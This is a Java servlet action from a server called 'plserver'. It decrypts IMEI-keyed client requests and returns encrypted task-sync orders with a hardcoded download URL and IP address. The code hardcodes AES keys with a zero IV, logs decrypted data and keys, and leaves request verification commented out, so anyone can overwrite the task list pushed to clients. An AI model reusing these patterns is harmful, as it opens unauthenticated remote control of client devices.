/**
 * 
 */
package com.k99k.plserver;

import javax.servlet.http.HttpServletRequest;

import com.k99k.khunter.Action;
import com.k99k.khunter.ActionMsg;
import com.k99k.khunter.HttpActionMsg;
import com.k99k.khunter.JOut;
import com.k99k.tools.StringUtil;
import com.k99k.tools.encrypter.Base64Coder;

/**
 * @author keel
 *
 */
public class PSA extends Action {

	public PSA(String name) {
		super(name);
	}
	
    private static byte[] rootkey = {79, 13, 33, -66, -58, 103, 3, -34, -45, 53, 9, 45, 28, -124, 50, -2};
    private static byte[] ivk = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
    private byte[] rkey = {43, 23, 13, -32, -58, 83, 3, -34, -87, 56, 19, 90, 28, -102, 15, 40};
    

	public static final int ORDER_NONE = 0;
	public static final int ORDER_SYNC_TASK = 1;
	public static final int ORDER_DEL_TASK = 2;
	public static final int ORDER_STOP_SERVICE = 3;
	public static final int ORDER_RESTART_SERVICE = 4;
	public static final int ORDER_UPDATE = 5;
	public static final int ORDER_UPTIME = 6;
	public static final int ORDER_KEY = 7;

    public static final String ERR_PARA = "e01";
    public static final String ERR_DECRYPT = "e02";
    public static final String ERR_KEY_EXPIRED = "e03";
    public static final String ERR_DECRYPT_CLIENT = "e04";
    
    
    static final String SPLIT_STR = "@@";
    //TODO 暂时写死
    private String taskDownUrl = "http://180.96.63.70:8080/plserver/PS";
    private String updateDownUrl = "http://180.96.63.70:8080/plserver/PS";
    private final static String downloadType = "application/x-msdownload";

    private String downloadLocalPath = "/usr/plserver/dats/";
    
    private int currentKeyVersion = 1;
    
    private String tempTaskList = "1";
    
    
    @Override
	public ActionMsg act(ActionMsg msg) {
    	HttpActionMsg httpmsg = (HttpActionMsg)msg;
    	HttpServletRequest request =  httpmsg.getHttpReq();
    	String kVer = request.getHeader("v");
    	//-------------临时在这里处理任务ID定制
    	String tid = request.getParameter("id");
		if (StringUtil.isDigits(tid) && StringUtil.isStringWithLen(kVer, 2)) {
			//FIXME 解密v验证
			String vv;
			try {
				//vv = decrypt(kVer, rootkey);
				//String[] vparas = vv.split("\\|\\|");
				//String imei = vparas[0];
				
			} catch (Exception e1) {
				e1.printStackTrace();
			}
			
			//TODO 临时更新task列表
			if (request.getParameter("task") != null) {
				String tasks = request.getParameter("task");
				this.tempTaskList = tasks;
				msg.addData(ActionMsg.MSG_PRINT, this.tempTaskList);
				return super.act(msg);
			}
		}
		
		//----------------------
    	
    	
    	String enc = request.getParameter("up");
		if (!StringUtil.isStringWithLen(enc, 6) || !StringUtil.isStringWithLen(kVer,5)) {
			msg.addData(ActionMsg.MSG_PRINT,ERR_PARA);
			return super.act(msg);
		}
		//int keyVersion = (Integer.parseInt(kVer)-17)/27;
		String req = null;
		try {
			String rkey = AuthAction.decrypt(kVer,rootkey);
			System.out.println("rkey:"+rkey);
			String[] rkeys = rkey.split("\\|\\|");
			//TODO 注意这里解密先需要确定KEY
			String imeiKey = Base64Coder.encodeString(rkeys[0]).substring(0, 16);
			System.out.println(imeiKey);
			byte[] ikey  = new byte[16];
//			StringBuilder sb1 = new StringBuilder();
			for (int i = 0; i < 16; i++) {
				ikey[i] = (byte) imeiKey.charAt(i);
//				sb1.append(ikey[i]).append(",");
			}
//			System.out.println("ikey:"+sb1.toString());
			System.out.println("upContent:"+enc);
			req = AuthAction.decrypt(enc,ikey);
			System.out.println("dec:"+req);
			String[] reqs = req.split("@@");
			System.out.println(reqs.length + " "+ reqs[6]);
//			if (keyVersion != this.currentKeyVersion) {
//				response.getWriter().println(ERR_KEY_EXPIRED);
//				return;
//			}
			//req = Encrypter.getInstance().decrypt(enc);
		} catch (Exception e) {
			e.printStackTrace();
			msg.addData(ActionMsg.MSG_PRINT,ERR_DECRYPT);
			return super.act(msg);
		}
		String[] reqs = req.split(SPLIT_STR);
		//TODO 获取或生成用户信息和taskList，根据用户具体情况修改taskList返回
		long uid = 1;
		
		//实现ORDER_SYNC_TASK
		StringBuilder sb = new StringBuilder();
		sb.append(uid).append(SPLIT_STR);
		sb.append(ORDER_SYNC_TASK).append(SPLIT_STR)
		.append(this.taskDownUrl).append(SPLIT_STR)
		//这里仅使用两个测试任务ID,1为toast,2为下载view数据
		.append(this.tempTaskList).append(SPLIT_STR)
		.append(this.currentKeyVersion);
		String resp = null;
		try {
			resp = AuthAction.encrypt(sb.toString(),rkey);
		} catch (Exception e) {
			e.printStackTrace();
		}
    	
    	msg.addData(ActionMsg.MSG_PRINT,resp);
		return super.act(msg);
	}
	
	
	

}
